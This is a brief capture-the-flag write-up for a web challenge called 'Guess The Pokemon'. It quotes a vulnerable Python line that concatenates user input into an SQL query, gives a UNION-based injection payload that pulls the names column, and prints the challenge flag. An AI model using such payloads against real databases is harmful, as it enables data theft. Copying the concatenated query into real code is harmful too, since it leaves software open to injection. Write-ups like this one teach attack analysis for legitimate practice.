# Guess The Pokemon
> Have you heard the new trending game? [GUESS THE POKEMON](http://litctf.live:31772/)!!! Please come try out our vast database of pokemons.
>
> Downloads
> [guess-the-pokemon.zip](https://drive.google.com/uc?export=download&id=1_NkoqdEGrYelVcKjVOVOJ0GmlBMxyXUs)

## Identifying the vulnerability
Code in line 27. of `main.py` contains a SQL injection vulnerability:
```py
cur.execute("SELECT * FROM pokemon WHERE names=" + name + "")
```
Since the table `pokemon` contains the flag, all we have to do is pass the following as our "guess":
```sql
0 union select names from pokemon
```

## Flag
`LITCTF{flagr3l4t3dt0pok3m0n0rsom3th1ng1dk}`
